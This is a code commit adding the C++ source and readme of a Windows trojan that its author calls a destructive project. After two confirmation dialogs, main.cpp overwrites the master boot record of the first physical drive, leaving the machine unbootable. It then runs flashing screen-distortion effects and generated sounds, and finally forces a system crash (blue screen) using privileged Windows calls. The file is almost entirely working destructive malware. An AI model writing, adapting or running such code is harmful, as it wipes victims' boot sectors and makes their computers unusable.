b90fa8ca44c622cf580ec3fb59ceb56099535cba
GigglesTheMalwareMaker <hodgesjeremiah385@gmail.com>
2024-06-06 11:25:32 -0500

    Add files via upload

---
+++ main.cpp
@@ -0,0 +1,247 @@
+#include <windows.h>
+#define _USE_MATH_DEFINES 1
+#include <cmath>
+#define RGBBRUSH (DWORD)0x1900ac010e
+#include <intrin.h>
+#pragma comment(lib, "winmm.lib")
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "kernel32.lib")
+//externing rtladjustprivilege
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+//externing ntraiseharderror
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
+
+const unsigned char MasterBootRecord[] = { 0xFA, 0x68, 0x00, 0xA0, 0x07, 0x31, 0xFF, 0x31, 0xC0, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xEB, 0x00, 0xB4, 0x0C, 0x04, 0x45, 0xB7, 0x00, 0x83, 0xC1, 0x45, 0x83, 0xC2, 0x00, 0xCD, 0x10, 0xB4, 0x0C, 0x04, 0x45, 0xB7, 0x00, 0x83, 0xC1, 0x00, 0x83, 0xC2, 0x45, 0xCD, 0x10, 0xEB, 0xE2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };
+
+DWORD xs;
+VOID SeedXorshift32(DWORD dwSeed) {
+xs = dwSeed;
+}
+DWORD xorshift32() {
+	xs ^= xs << 13;
+	xs ^= xs << 17;
+	xs ^= xs << 5;
+	return xs;
+}
+void mbr()
+{    
+    DWORD dwBytesWritten;
+		HANDLE hDevice = CreateFileW(
+			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
+			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
+			OPEN_EXISTING, 0, 0);
+
+		WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
+		CloseHandle(hDevice);
+}
+DWORD WINAPI shuffle(LPVOID lpParam)
+{
+	int sw = GetSystemMetrics(SM_CXSCREEN);
+	int sh = GetSystemMetrics(SM_CYSCREEN);
+	while (true)
+	{
+		HDC hdc = GetDC(NULL);
+		int a = rand() % sw, b = rand() % sh;
+		BitBlt(hdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, SRCCOPY);
+		ReleaseDC(NULL, hdc);
+	}
+}
+DWORD WINAPI upper(LPVOID lpParam) {
+	HDC hdc = GetDC(NULL);
+	int sw = GetSystemMetrics(SM_CXSCREEN);
+	int sh = GetSystemMetrics(SM_CYSCREEN);
+	while (1) {
+		hdc = GetDC(NULL);
+		BitBlt(hdc, -2, -2, sw, sh, hdc, 1, 1, SRCCOPY);
+		ReleaseDC(0, hdc);
+		Sleep(4);
+	}
+}
+VOID WINAPI ci(int x, int y, int w, int h)
+{
+    HDC hdc = GetDC(0);
+    HRGN hrgn = CreateEllipticRgn(x, y, w+x, h+y);
+    SelectClipRgn(hdc, hrgn);
+    BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
+    DeleteObject(hrgn);
+    ReleaseDC(NULL, hdc);
+}
+DWORD WINAPI payload3(LPVOID lpParam) {
+	HDC desk = GetDC(0);
+	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+	int rx;
+	for (int i = 0;; i++) {
+		SeedXorshift32(__rdtsc());
+		desk = GetDC(0);
+		rx = xorshift32() % sw;
+		int ry = xorshift32() % sh;
+		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
+		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
+		BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
+		BitBlt(desk, 10, ry, sw, 96, desk, 0, ry, RGBBRUSH);
+		BitBlt(desk, -10, ry, sw, -96, desk, 0, ry, RGBBRUSH);
+		Sleep(1);
+	}
+}
+DWORD WINAPI wef(LPVOID lpParam) {
+    RECT rect;
+    GetWindowRect(GetDesktopWindow(), &rect);
+    int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
+ 
+    for (int t = 0;; t++)
+    {
+        const int size = 1000;
+        int x = rand()%(w+size)-size/2, y = rand()%(h+size)-size/2;
+ 
+        for (int i = 0; i < size; i+=100)
+        {
+            ci(x-i/2, y-i/2, i, i);
+            Sleep(25);
+        }
+    }
+}
+DWORD WINAPI beziers(LPVOID lpParam)
+{
+	int sw = GetSystemMetrics(0);
+    int sh = GetSystemMetrics(1);
+    while(1){
+    	HDC hdc = GetDC(0);
+		POINT p[4]  = {rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh};
+        HPEN hPen = CreatePen(PS_SOLID,5,RGB(0,0,255));
+        SelectObject(hdc, hPen);
+		PolyBezier(hdc, p, 4);
+    	DeleteObject(hPen);
+		ReleaseDC(0, hdc);
+	}
+}
+DWORD WINAPI sines(LPVOID lpParam)
+{
+  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
+  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
+  double angle = 0;
+  while (1) {
+    desk = GetDC(0);
+    for (float i = 0; i < sw + sh; i += 0.99f) {
+      int a = sin(angle) * 20;
+      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
+      angle += M_PI / 40;
+      DeleteObject(&i); DeleteObject(&a);
+    }
+    ReleaseDC(wnd, desk);
+    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
+  }
+}
+VOID WINAPI sound1() {
+    HWAVEOUT hWaveOut = 0;
+    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+    char buffer[8000 * 30] = {};
+    for (DWORD t = 0; t < sizeof(buffer); ++t)
+        buffer[t] = static_cast<char>(((t*2)&(t>>1))|(t*2&t>>1)|(t*2&t/2))-1;
+
+    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutClose(hWaveOut);
+}
+VOID WINAPI sound2() {
+    HWAVEOUT hWaveOut = 0;
+    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+    char buffer[8000 * 30] = {};
+    for (DWORD t = 0; t < sizeof(buffer); ++t)
+        buffer[t] = static_cast<char>(t/9>>(t>>9)*t/((t>>3&1)+99));
+
+    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutClose(hWaveOut);
+}
+VOID WINAPI sound3() {
+    HWAVEOUT hWaveOut = 0;
+    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
+    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+    char buffer[22050 * 30] = {};
+    for (DWORD t = 0; t < sizeof(buffer); ++t)
+        buffer[t] = static_cast<char>(t>>9)|(t>>2);
+
+    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutClose(hWaveOut);
+}
+VOID WINAPI sound4() {
+    HWAVEOUT hWaveOut = 0;
+    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
+    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+    char buffer[8000 * 30] = {};
+    for (DWORD t = 0; t < sizeof(buffer); ++t)
+        buffer[t] = static_cast<char>(t * (t >> 2 | t >> 7));
+
+    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
+    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
+    waveOutClose(hWaveOut);
+}
+
+int main(){
+    if (MessageBoxW(NULL, L"!!Warning!! totaly mayhem.\r\n\Do Malware start virus come out to me Run Malware Playloads? Ready?", L"EVITCIRTSEDNIW.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+    {
+        ExitProcess(0);
+    }
+    else
+    {
+        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
+the software has last warning please start virus malware?", L"Where Going do destroy computer", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
+        {
+            ExitProcess(0);
+        }
+        else
+        {
+        	mbr();
+        	HANDLE thread1 = CreateThread(0, 0, shuffle, 0, 0, 0);
+        	sound1();
+        	Sleep(30000);
+        	TerminateThread(thread1, 0);
+            CloseHandle(thread1);
+            InvalidateRect(0, 0, 0);
+            Sleep(1000);
+        	HANDLE thread2 = CreateThread(0, 0, upper, 0, 0, 0);
+        	HANDLE thread3 = CreateThread(0, 0, wef, 0, 0, 0);
+        	sound2();
+        	Sleep(30000);
+        	TerminateThread(thread2, 0);
+            CloseHandle(thread2);
+            InvalidateRect(0, 0, 0);
+        	TerminateThread(thread3, 0);
+            CloseHandle(thread3);
+            InvalidateRect(0, 0, 0);
+            Sleep(1000);
+            HANDLE thread4 = CreateThread(0, 0, payload3, 0, 0, 0);
+			sound3();
+			Sleep(30000);
+			TerminateThread(thread4, 0);
+            CloseHandle(thread4);
+            InvalidateRect(0, 0, 0);
+            Sleep(2000);
+        	HANDLE thread5 = CreateThread(0, 0, beziers, 0, 0, 0);
+        	HANDLE thread6 = CreateThread(0, 0, sines, 0, 0, 0);
+        	HANDLE thread7 = CreateThread(0, 0, wef, 0, 0, 0);
+        	sound4();
+        	Sleep(30000);
+			//boolean
+			BOOLEAN b;
+			//bsod response
+			unsigned long response;
+			//process privilege
+			RtlAdjustPrivilege(19, true, false, &b);
+			//call bsod
+			NtRaiseHardError(0xC0000166, 0, 0, 0, 6, &response);
+			Sleep(-1);
+		}
+	}
+}
---
+++ readme.txt
@@ -0,0 +1,10 @@
+E V V       tci    s         i
+    v     i       rt    ed N    w
+
+made in c++
+by Hoang Dat
+
+MY MOST DESTRUC TIVE PROJECT
+SHORT TROJAN
+
+NO, NOT SKIDD3D
